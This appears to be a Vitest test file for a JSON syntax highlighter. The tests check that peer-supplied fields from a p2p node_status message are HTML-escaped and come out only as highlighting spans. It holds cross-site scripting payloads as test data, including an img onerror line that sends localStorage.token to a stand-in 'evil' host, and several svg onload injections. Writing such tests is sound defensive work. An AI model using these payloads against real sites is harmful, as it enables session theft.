import { describe, it, expect } from 'vitest'
import { escapeHtml, formatJSON } from './json-highlight'

/**
 * The only tags formatJSON is ever allowed to emit are the highlighting spans
 * it adds itself. Anything else means peer-controlled text reached the {@html}
 * sink as markup.
 */
const ALLOWED_TAG =
  /^(?:<span class="json-(?:key|string|number|boolean|null)">|<\/span>)$/

function tagsIn(html: string): string[] {
  return html.match(/<[^>]*>/g) ?? []
}

describe('escapeHtml', () => {
  it('escapes the characters that turn text into markup', () => {
    expect(escapeHtml('<img src=x onerror=alert(1)>')).toBe(
      '&lt;img src=x onerror=alert(1)&gt;',
    )
  })

  it('escapes & first so existing entities cannot be re-decoded into tags', () => {
    expect(escapeHtml('&lt;script&gt;')).toBe('&amp;lt;script&amp;gt;')
  })
})

describe('formatJSON', () => {
  it('renders a node_status payload without emitting attacker markup', () => {
    const message = {
      type: 'node_status',
      peer_id: '16Uiu2HAmPeerIdOfTheAttacker',
      client_name: `<img src=x onerror=fetch('//evil/'+localStorage.token)>`,
    }

    const html = formatJSON(message)

    // The payload survives as inert text, not as an element.
    expect(html).not.toContain('<img')
    expect(html).toContain('&lt;img src=x onerror=fetch')
    expect(tagsIn(html).every((tag) => ALLOWED_TAG.test(tag))).toBe(true)
  })

  // These reach the highlighter unchanged even with the service-side sanitizer
  // in front of it, and a quote-unaware highlighter splices its own span markup
  // apart on them.
  it.each([
    [':evil', { client_name: ':evil' }],
    ['quote-escaped token', { client_name: 'x": 1, ":z' }],
    ['token inside a string', { client_name: 'a: true b: 12 c: null' }],
    ['lone quote', { client_name: '"' }],
    ['backslash before quote', { client_name: 'a\\' }],
  ])('emits only highlighting spans for %s', (_name, message) => {
    expect(tagsIn(formatJSON(message)).every((tag) => ALLOWED_TAG.test(tag))).toBe(true)
  })

  it('emits only highlighting spans for every hostile field of a gossip message', () => {
    // Every peer-controlled string the p2p service forwards to /p2p-ws.
    const hostile = `</span><svg/onload=alert(1)>`
    const message = {
      type: 'node_status',
      version: hostile,
      commit_hash: hostile,
      client_name: hostile,
      miner_name: hostile,
      listen_mode: hostile,
      chain_work: hostile,
      storage: hostile,
      fsm_state: hostile,
      sync_peer_id: hostile,
      best_height: 123,
      uptime: 4.5,
      listening: true,
      fee_policy: null,
      nested: { deep: [hostile, { deeper: hostile }] },
      [hostile]: hostile, // hostile property *name*, not just value
    }

    const html = formatJSON(message)

    expect(html).not.toContain('<svg')
    // The closing tag in the payload must not be able to escape our own span.
    expect(html).not.toContain('</span><svg')
    expect(tagsIn(html).every((tag) => ALLOWED_TAG.test(tag))).toBe(true)
  })

  it('still highlights JSON tokens', () => {
    const html = formatJSON({ name: 'teranode', height: 42, ok: true, extra: null })

    expect(html).toContain('<span class="json-key">"name"</span>:')
    expect(html).toContain('<span class="json-string">"teranode"</span>')
    expect(html).toContain('<span class="json-number">42</span>')
    expect(html).toContain('<span class="json-boolean">true</span>')
    expect(html).toContain('<span class="json-null">null</span>')
  })

  it('falls back to {} for values JSON.stringify cannot render', () => {
    const circular: Record<string, unknown> = {}
    circular.self = circular

    expect(formatJSON(circular)).toBe('{}')
    expect(formatJSON(undefined)).toBe('{}')
  })
})
